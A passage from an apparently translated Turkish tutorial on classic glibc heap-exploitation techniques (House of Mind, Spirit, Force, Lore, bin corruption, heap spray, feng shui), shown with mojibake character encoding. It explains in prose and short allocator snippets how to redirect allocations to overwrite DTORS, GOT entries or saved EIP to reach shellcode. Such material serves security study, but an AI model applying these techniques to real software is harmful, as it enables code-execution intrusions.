Ã–nceki bÃ¶lÃ¼mde av deÄŸerini kontrol edebildiÄŸimiz iÃ§in, serbest bÄ±rakÄ±lacak parÃ§anÄ±n Ã¼zerine yazdÄ±ÄŸÄ±mÄ±z deÄŸeri kontrol edebiliriz.

unsorted\_chunks fonksiyonunun tanÄ±mÄ±na gÃ¶re biliyoruz ki:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Bu nedenle, av->bins\[2] adresine \_\_DTOR\_END\_\_-12 adresini yazarsak, son komutta \_\_DTOR\_END\_\_ adresine ikinci parÃ§anÄ±n adresi yazÄ±lacaktÄ±r.

Yani, ilk parÃ§aya \_\_DTOR\_END\_\_-12 adresini baÅŸa Ã§ok kez yazmalÄ±yÄ±z Ã§Ã¼nkÃ¼ av->bins\[2] buradan alacaktÄ±r.

Ä°kinci parÃ§ada ve ilk parÃ§anÄ±n yardÄ±mÄ±yla prev\_size'a bir jump 0x0c ve size'a -> NON\_MAIN\_ARENA'yÄ± etkinleÅŸtirecek bir deÄŸer yazmalÄ±yÄ±z.

ArdÄ±ndan, ikinci parÃ§aya Ã§ok sayÄ±da nops ve sonunda shellcode'u ekleriz.

Bu ÅŸekilde, \_int\_free(TROZO1, TROZO2) Ã§aÄŸrÄ±lÄ±r ve \_\_DTOR\_END\_\_ adresine TROZO2'nin prev\_size adresi yazÄ±lÄ±r, bu da shellcode'a atlar.
Bu tekniÄŸi uygulamak iÃ§in payload'u biraz daha karmaÅŸÄ±k hale getiren bazÄ± gereksinimlerin karÅŸÄ±lanmasÄ± gerekmektedir.

Bu teknik artÄ±k uygulanabilir deÄŸil Ã§Ã¼nkÃ¼ unlink iÃ§in neredeyse aynÄ± yama uygulandÄ±. Yeni hedef siteye iÅŸaret edilip edilmediÄŸi kontrol edilir.

**Fastbin**

The house of mind'in bir varyantÄ±dÄ±r.

\_int\_free() fonksiyonunun ilk kontrolÃ¼nden sonra aÅŸaÄŸÄ±daki kodu Ã§alÄ±ÅŸtÄ±rmak istiyoruz.

fb = &(av->fastbins\[fastbin\_index(size)] â€”> fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

Bu ÅŸekilde, "fb" adresi GOT'taki bir fonksiyonun adresini verirse, bu adrese Ã¼zerine yazÄ±lacak olan parÃ§anÄ±n adresi konulacaktÄ±r. Bunun iÃ§in, arena'nÄ±n dtors adreslerine yakÄ±n olmasÄ± gerekecektir. Daha doÄŸrusu, av->max\_fast'in Ã¼zerine yazÄ±lacak adres olmasÄ± gerekmektedir.

The House of Mind ile kontrolÃ¼n av'nin konumunu bizim kontrol ettiÄŸimizi gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z iÃ§in.

Bu durumda, boyut alanÄ±na 8 + NON\_MAIN\_ARENA + PREV\_INUSE boyutunu koyarsak â€”> fastbin\_index() bize fastbins\[-1] dÃ¶ndÃ¼recektir, bu da av->max\_fast'e iÅŸaret edecektir.

Bu durumda av->max\_fast'in Ã¼zerine yazÄ±lacak adres olacaktÄ±r (iÅŸaret ettiÄŸi deÄŸil, Ã¼zerine yazÄ±lacak olan pozisyon).

AyrÄ±ca, serbest bÄ±rakÄ±lan parÃ§anÄ±n bitiÅŸik parÃ§asÄ±nÄ±n 8'den bÃ¼yÃ¼k olmasÄ± gerekmektedir -> Serbest bÄ±rakÄ±lan parÃ§anÄ±n boyutunun 8 olduÄŸunu sÃ¶ylediÄŸimize gÃ¶re, bu sahte parÃ§aya sadece 8'den bÃ¼yÃ¼k bir boyut koymamÄ±z yeterli olacaktÄ±r (ayrÄ±ca shellcode'un serbest bÄ±rakÄ±lan parÃ§ada olacaÄŸÄ±nÄ± dÃ¼ÅŸÃ¼ndÃ¼ÄŸÃ¼mÃ¼zden, baÅŸlangÄ±Ã§ta bir jmp koymamÄ±z gerekecektir).

AyrÄ±ca, aynÄ± sahte parÃ§anÄ±n av->system\_mem'den kÃ¼Ã§Ã¼k olmasÄ± gerekmektedir. av->system\_mem 1848 bayt daha ileridedir.

\_DTOR\_END\_ ve GOT'taki az sayÄ±da adres nedeniyle, bu bÃ¶lÃ¼mlerin hiÃ§biri Ã¼zerine yazÄ±lacak adres olarak uygun deÄŸildir, bu yÃ¼zden pili hedeflemek iÃ§in fastbin'i nasÄ±l uygulayacaÄŸÄ±mÄ±za bakalÄ±m.

BaÅŸka bir saldÄ±rÄ± ÅŸekli de **av**'yi pile yÃ¶nlendirmektir.

Boyutu 8 yerine 16 yapacak ÅŸekilde deÄŸiÅŸtirirsek: fastbin\_index() bize fastbins\[0] dÃ¶ndÃ¼recektir ve bunu pile yazmak iÃ§in kullanabiliriz.

Bunun iÃ§in pile canary veya garip deÄŸerler olmamalÄ±dÄ±r, aslÄ±nda ÅŸu ÅŸekilde olmalÄ±dÄ±r: 4 bayt null + EBP + RET

4 bayt null, **av**'nin bu adrese iÅŸaret edeceÄŸi ve bir **av**'nin ilk Ã¶ÄŸesinin 0 olmasÄ± gereken mutex iÃ§indir.

**av->max\_fast** EBP olacak ve bizi kÄ±sÄ±tlamalardan kaÃ§Ä±nmamÄ±za yardÄ±mcÄ± olacak bir deÄŸer olacaktÄ±r.

**av->fastbins\[0]** adresi **p**'nin adresiyle Ã¼zerine yazÄ±lacak ve RET olacaktÄ±r, bÃ¶ylece shellcode'a atlanacaktÄ±r.

AyrÄ±ca, **av->system\_mem** (pile gÃ¶re 1484 bayt yukarÄ±da) bize izin veren oldukÃ§a fazla Ã§Ã¶p olacaktÄ±r.

AyrÄ±ca, serbest bÄ±rakÄ±lan parÃ§anÄ±n bitiÅŸik parÃ§asÄ±nÄ±n 8'den bÃ¼yÃ¼k olmasÄ± gerekmektedir -> Serbest bÄ±rakÄ±lan parÃ§anÄ±n boyutunun 16 olduÄŸunu sÃ¶ylediÄŸimize gÃ¶re, bu sahte parÃ§aya sadece 8'den bÃ¼yÃ¼k bir boyut koymamÄ±z yeterli olacaktÄ±r (ayrÄ±ca shellcode'un serbest bÄ±rakÄ±lan parÃ§ada olacaÄŸÄ±nÄ± dÃ¼ÅŸÃ¼ndÃ¼ÄŸÃ¼mÃ¼zden, yeni sahte parÃ§anÄ±n boyut alanÄ±nÄ±n hemen sonrasÄ±na dÃ¼ÅŸen nops'a atlayan bir jmp koymamÄ±z gerekecektir).

**The House of Spirit**

Bu durumda, saldÄ±rgan tarafÄ±ndan deÄŸiÅŸtirilebilecek bir malloc iÅŸaretÃ§isine sahip olmayÄ± amaÃ§lÄ±yoruz (Ã¶rneÄŸin, iÅŸaretÃ§inin bir deÄŸiÅŸken Ã¼zerine taÅŸma olasÄ±lÄ±ÄŸÄ± olan yÄ±ÄŸÄ±nÄ±n altÄ±nda olmasÄ±).

BÃ¶ylece, bu iÅŸaretÃ§iyi istediÄŸi yere iÅŸaret edecek ÅŸekilde yapabiliriz. Ancak, herhangi bir yer uygun deÄŸildir, sahte parÃ§anÄ±n boyutu av->max\_fast'ten kÃ¼Ã§Ã¼k olmalÄ± ve daha spesifik olarak gelecekteki bir malloc() Ã§aÄŸrÄ±sÄ±nda istenen boyuta 8 eklenmelidir. Bu nedenle, eÄŸer bu savunmasÄ±z iÅŸaretÃ§iden sonra 40'lÄ±k bir malloc Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nÄ± biliyorsak, sahte parÃ§anÄ±n boyutu 48 olmalÄ±dÄ±r.

Ã–rneÄŸin, program kullanÄ±cÄ±dan bir sayÄ± istediÄŸinde 48 girebilir ve deÄŸiÅŸtirilebilir malloc iÅŸaretÃ§isini 4 bayt sonraki deÄŸerlere (ÅŸans eseri EBP'ye ait olabilir, bÃ¶ylece 48 arkada kalÄ±r gibi) yÃ¶nlendirebiliriz. AyrÄ±ca, ptr-4+48 adresinin Ã§eÅŸitli koÅŸullarÄ± karÅŸÄ±lamasÄ± gerekmektedir (bu durumda ptr=EBP), yani 8 < ptr-4+48 < av->system\_mem olmalÄ±dÄ±r.

Bu koÅŸullar saÄŸlandÄ±ÄŸÄ±nda, sÃ¶z konusu malloc(40) Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda EBP'nin adresi olarak atanacaktÄ±r. SaldÄ±rgan ayrÄ±ca bu malloc'ta ne yazÄ±lacaÄŸÄ±nÄ± kontrol edebiliyorsa, EBP ve EIP'yi istediÄŸi adrese Ã¼zerine yazabilir.

Bu, Ã§Ã¼nkÃ¼ free() iÅŸlemi, yÄ±ÄŸÄ±nÄ±n EBP'sine iÅŸaret eden bir parÃ§anÄ±n yeni malloc() iÃ§in mÃ¼kemmel boyutta bir parÃ§a olduÄŸunu hatÄ±rlayacak ve bu nedenle o adrese atayacaktÄ±r.

**The House of Force**

Gereksinimler:

* Wilderness'Ä± Ã¼zerine yazÄ±labilir hale getiren bir taÅŸma
* KullanÄ±cÄ± tarafÄ±ndan tanÄ±mlanan boyutta bir malloc() Ã§aÄŸrÄ±sÄ±
* KullanÄ±cÄ± tarafÄ±ndan tanÄ±mlanan verilere sahip bir malloc() Ã§aÄŸrÄ±sÄ±

Ä°lk olarak, wilderness parÃ§asÄ±nÄ±n boyutunu Ã§ok bÃ¼yÃ¼k bir deÄŸerle (0xffffffff) Ã¼zerine yazmak, yeterince bÃ¼yÃ¼k bir bellek talebinin heap'i geniÅŸletmeden \_int\_malloc() tarafÄ±ndan iÅŸlenmesini saÄŸlar.

Ä°kincisi, av->top'u, saldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki bir bellek bÃ¶lgesine, Ã¶rneÄŸin yÄ±ÄŸÄ±n, iÅŸaret edecek ÅŸekilde deÄŸiÅŸtirmektir. av->top'a \&EIP - 8 konulacaktÄ±r.

SaldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki bellek bÃ¶lgesine iÅŸaret eden av->top'u deÄŸiÅŸtirmemiz gerekmektedir:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim, mevcut wilderness parÃ§asÄ±nÄ±n adresini (mevcut av->top) alÄ±r ve remainder tam olarak bu adresin malloc() tarafÄ±ndan talep edilen bayt sayÄ±sÄ± kadar ilerisine denk gelir. Bu nedenle, \&EIP-8'in 0xbffff224 olduÄŸu ve av->top'un 0x080c2788 olduÄŸu durumda, av->top'un bir sonraki malloc() iÃ§in \&EIP-8'e iÅŸaret etmesi gereken malloc'ta rezerve edilmesi gereken bayt miktarÄ± ÅŸÃ¶yle olacaktÄ±r:

0xbffff224 - 0x080c2788 = 3086207644.

Bu ÅŸekilde deÄŸiÅŸtirilmiÅŸ deÄŸer av->top'a kaydedilecek ve bir sonraki malloc EIP'ye iÅŸaret edecek ve Ã¼zerine yazabilecektir.

Yeni wilderness parÃ§asÄ±nÄ±n boyutunun, son malloc() tarafÄ±ndan yapÄ±lan talepten daha bÃ¼yÃ¼k olmasÄ± Ã¶nemlidir. Yani, wilderness \&EIP-8'e iÅŸaret ediyorsa, boyut tam olarak yÄ±ÄŸÄ±nÄ±n EBP alanÄ±nda kalacaktÄ±r.

**The House of Lore**

**SmallBin BozulmasÄ±**

Serbest bÄ±rakÄ±lan parÃ§alar, boyutlarÄ±na gÃ¶re binlere yerleÅŸtirilir. Ancak, bunlar binlere yerleÅŸtirilmeden Ã¶nce sÄ±ralanmamÄ±ÅŸ binlerde saklanÄ±r. Bir parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda, hemen kendi uygun binine konulmaz, sÄ±ralanmamÄ±ÅŸ binlerde kalÄ±r. Sonra, yeni bir parÃ§a rezerve edilirse ve Ã¶nceki serbest bÄ±rakÄ±lan parÃ§a yeterliyse, bu parÃ§a geri verilir, ancak daha bÃ¼yÃ¼k bir parÃ§a rezerve edilirse, sÄ±ralanmamÄ±ÅŸ binlerdeki serbest bÄ±rakÄ±lan parÃ§a uygun binine konulur.

ZararlÄ± kodun ulaÅŸÄ±labilir olmasÄ± iÃ§in bellek talebi av->max\_fast'tan bÃ¼yÃ¼k (genellikle 72) ve MIN\_LARGE\_SIZE'dan kÃ¼Ã§Ã¼k (512) olmalÄ±dÄ±r.

EÄŸer uygun boyutta bir parÃ§a varsa, bu parÃ§a geri verilir ve ardÄ±ndan ÅŸunlar yapÄ±lÄ±r:

bck = victim->bk; Ã–nceki parÃ§aya iÅŸaret eder, deÄŸiÅŸtirebileceÄŸimiz tek bilgidir.

bin->bk = bck; Bir Ã¶nceki parÃ§a son parÃ§a olur, bck yÄ±ÄŸÄ±nÄ± iÅŸaret ediyorsa, bir sonraki rezerve edilen parÃ§aya bu adres verilecektir.

bck->fd = bin; Liste kapatÄ±lÄ±r ve bu bin'i iÅŸaret eder.

Gereksinimler:
Ä°ki malloc ayrÄ±lmalÄ±, bÃ¶ylece ilkine ikincisi serbest bÄ±rakÄ±ldÄ±ktan sonra taÅŸma yapÄ±labilir (yani taÅŸma yapmadan Ã¶nce ikinci parÃ§anÄ±n bir malloc'tan daha bÃ¼yÃ¼k bir parÃ§a olmasÄ± gerekmektedir).

SaldÄ±rganÄ±n kontrol edebileceÄŸi saldÄ±rgan tarafÄ±ndan seÃ§ilen bir adresi olan ayrÄ±lan malloc.

AmacÄ±mÄ±z ÅŸudur, bir heap'e taÅŸma yapabilirsek ve altÄ±nda serbest bÄ±rakÄ±lmÄ±ÅŸ ve bin'ine (yani taÅŸmadan Ã¶nce ikinci parÃ§anÄ±n bir malloc'tan daha bÃ¼yÃ¼k bir parÃ§a olmasÄ± gerekmektedir) yerleÅŸtirilmiÅŸ bir parÃ§a varsa, bk iÅŸaretÃ§isini deÄŸiÅŸtirebiliriz. Bk iÅŸaretÃ§isini deÄŸiÅŸtirirsek ve bu parÃ§a bin'in listenin ilk parÃ§asÄ± haline gelirse ve ayrÄ±ldÄ±ÄŸÄ±nda, bin yanÄ±ltÄ±lacak ve bir sonraki parÃ§anÄ±n (sunulan) yanlÄ±ÅŸ adreste olduÄŸuna inanÄ±lacak (Ã¶rneÄŸin stack veya GOT'a). Bu durumda baÅŸka bir parÃ§a yeniden ayrÄ±ldÄ±ÄŸÄ±nda ve saldÄ±rganÄ±n izinleri varsa, istenen konumda bir parÃ§a verilecek ve oraya yazabilecektir.

DeÄŸiÅŸtirilen parÃ§anÄ±n serbest bÄ±rakÄ±lmasÄ±ndan sonra serbest bÄ±rakÄ±lan parÃ§adan daha bÃ¼yÃ¼k bir parÃ§a ayrÄ±lmasÄ± gerekmektedir, bÃ¶ylece deÄŸiÅŸtirilen parÃ§a sÄ±ralanmamÄ±ÅŸ binlerden Ã§Ä±kar ve bin'ine yerleÅŸtirilir.

Bin'e yerleÅŸtirildikten sonra, taÅŸma yoluyla bk iÅŸaretÃ§isini deÄŸiÅŸtirmek iÃ§in zamanÄ± gelir, bÃ¶ylece bin, malloc() yeterince Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda deÄŸiÅŸtirilmiÅŸ bin'i tekrar kullanÄ±r ve bin'i yanÄ±ltarak bir sonraki parÃ§anÄ±n yanlÄ±ÅŸ adreste olduÄŸuna inanÄ±r. Ve ardÄ±ndan istenen parÃ§a verilecektir.

Bu zafiyetin mÃ¼mkÃ¼n olan en kÄ±sa sÃ¼rede gerÃ§ekleÅŸmesi iÃ§in ideal olan ÅŸudur: Zafiyetli parÃ§anÄ±n ayrÄ±lmasÄ±, deÄŸiÅŸtirilecek parÃ§anÄ±n ayrÄ±lmasÄ±, bu parÃ§anÄ±n serbest bÄ±rakÄ±lmasÄ±, deÄŸiÅŸtirilecek parÃ§adan daha bÃ¼yÃ¼k bir parÃ§a ayrÄ±lmasÄ±, parÃ§a deÄŸiÅŸtirilir (zafiyet), zafiyetli parÃ§adan aynÄ± boyutta bir parÃ§a ayrÄ±lmasÄ± ve zafiyetli parÃ§adan aynÄ± boyutta ikinci bir parÃ§a ayrÄ±lmasÄ± ve bu parÃ§a seÃ§ilen adrese iÅŸaret edecektir.

Bu saldÄ±rÄ±yÄ± korumak iÃ§in, tipik olarak "yanlÄ±ÅŸ" parÃ§anÄ±n kontrol edilmesi kullanÄ±lmÄ±ÅŸtÄ±r: bk->fd'nin victim'a iÅŸaret etmediÄŸi kontrol edilir. Yani, bizim durumumuzda, stack'te iÅŸaret edilen yanlÄ±ÅŸ parÃ§anÄ±n fd\* iÅŸaretÃ§isinin victim'a iÅŸaret edip etmediÄŸi kontrol edilir. Bu korumayÄ± aÅŸmak iÃ§in saldÄ±rganÄ±n, uygun ÅŸekilde (muhtemelen stack Ã¼zerinden) victim'Ä±n adresini yazabilmesi gerekir. BÃ¶ylece gerÃ§ek bir parÃ§a gibi gÃ¶rÃ¼nÃ¼r.

**LargeBin BozulmasÄ±**

Ã–nceki gereksinimlerin yanÄ± sÄ±ra, ayrÄ±lan parÃ§alarÄ±n 512'den bÃ¼yÃ¼k olmasÄ± gerekmektedir.

SaldÄ±rÄ±, Ã¶ncekiyle aynÄ±dÄ±r, yani bk iÅŸaretÃ§isini deÄŸiÅŸtirmek gerekmektedir ve tÃ¼m bu malloc() Ã§aÄŸrÄ±larÄ±na ihtiyaÃ§ vardÄ±r, ancak deÄŸiÅŸtirilen parÃ§anÄ±n boyutunu deÄŸiÅŸtirmek gerekmektedir, bÃ¶ylece bu boyut - nb < MINSIZE olmalÄ±dÄ±r.

Ã–rneÄŸin, 1552 boyutunda bir parÃ§a koymak, 1552 - 1544 = 8 < MINSIZE olacak ÅŸekilde boyutu deÄŸiÅŸtirmek anlamÄ±na gelir (Ã§Ä±karma negatif olmamalÄ±dÄ±r Ã§Ã¼nkÃ¼ bir unsigned karÅŸÄ±laÅŸtÄ±rÄ±lÄ±r).

AyrÄ±ca, daha karmaÅŸÄ±k hale getirmek iÃ§in bir yama eklenmiÅŸtir.

**Heap Spreyi**

Temelde, mÃ¼mkÃ¼n olan tÃ¼m belleÄŸi heap'ler iÃ§in ayÄ±rmak ve bunlarÄ± bir shellcode ile biten bir nops yastÄ±ÄŸÄ± ile doldurmaktÄ±r. AyrÄ±ca, yastÄ±k olarak 0x0c kullanÄ±lÄ±r. Yani, 0x0c0c0c0c adresine atlamaya Ã§alÄ±ÅŸÄ±lacak ve bÃ¶ylece bu yastÄ±kla Ã§aÄŸrÄ±lacak bir adres Ã¼zerine yazÄ±lÄ±rsa oraya atlanacaktÄ±r. Temel olarak taktik, birÃ§ok ÅŸeyi ayÄ±rmak ve bir noktaya atlamak iÃ§in 0x0c0c0c0c adresine atlamayÄ± denemektir, umut ederek orada nops olacaÄŸÄ±nÄ±.

**Heap Feng Shui**

BelleÄŸi parÃ§alar arasÄ±nda serbest bÄ±rakÄ±lmÄ±ÅŸ parÃ§alarÄ±n arasÄ±nda kalan parÃ§alar ÅŸeklinde sementlemek iÃ§in rezervasyonlar ve serbest bÄ±rakmalar kullanmaktÄ±r. TaÅŸmayÄ± yapÄ±lacak tampon bir yumurtanÄ±n iÃ§ine yerleÅŸtirilecektir.
